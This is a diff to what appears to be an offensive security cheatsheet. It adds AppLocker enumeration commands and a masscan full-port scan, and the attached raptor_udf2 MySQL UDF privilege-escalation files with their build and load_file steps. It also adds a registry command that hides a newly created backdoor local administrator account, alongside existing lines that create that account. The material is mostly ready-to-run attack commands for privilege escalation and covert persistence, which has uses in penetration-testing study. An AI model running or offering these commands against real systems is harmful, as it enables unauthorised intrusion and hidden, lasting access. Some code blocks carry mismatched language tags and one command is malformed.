@@ -446,6 +446,14 @@ __import__('os').system('id')
 
 ![https://github.com/sagishahar/lpeworkshop](../../.gitbook/assets/privesc.jpg)
 
+### Check AppLocker Policies
+
+```text
+Get-AppLockerPolicy -Local).RuleCollections
+Get-ChildItem -Path HKLM:Software\Policies\Microsoft\Windows\SrpV2 -Recurse
+reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\
+```
+
 ### Check if Powershell Logging is Enabled
 
 ```text
@@ -504,13 +512,19 @@ php -S 0.0.0.0:80
 
 ### MySQL User Defined Fuction Privilge Escalation
 
-Requires [raptor\_udf2.c](https://github.com/mantvydasb/Offensive-Security-Cheatsheets/blob/master/raptor_udf2.c) and [sid-shell.c](https://github.com/mantvydasb/Offensive-Security-Cheatsheets/blob/master/sid-shell.c) or [full tarball](https://github.com/mantvydasb/Offensive-Security-Cheatsheets/blob/master/raptor/raptor.tar)
+Requires raptor\_udf2.c and sid-shell.c or full raptor.tar:
 
-```bash
+{% file src="../../.gitbook/assets/sid-shell.c" %}
+
+{% file src="../../.gitbook/assets/raptor\_udf2.c" %}
+
+{% file src="../../.gitbook/assets/raptor.tar" %}
+
+```erlang
 gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
 ```
 
-```text
+```erlang
 use mysql;
 create table npn(line blob);
 insert into npn values(load_file('/tmp/raptor_udf2.so'));
@@ -720,6 +734,12 @@ nc -nvv -w 1 -z host 1000-2000
 nc -nv -u -z -w 1 host 160-162
 ```
 
+### Port Scanning with Masscan
+
+```erlang
+masscan -p1-65535,U:1-65535 10.10.10.x --rate=1000 -e tun0
+```
+
 ### Exploiting Vulnerable Windows Services: Weak Service Permissions
 
 ```csharp
@@ -916,6 +936,12 @@ wine vncpwdump.exe -k key
 
 ```bash
 net user spotless spotless /add & net localgroup Administrators spotless /add
+```
+
+### Hide Newly Created Local administrator
+
+```erlang
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /t REG_DWORD /v spotless /d 0 /f
 ```
 
 ### Creating SSH Authorized Keys
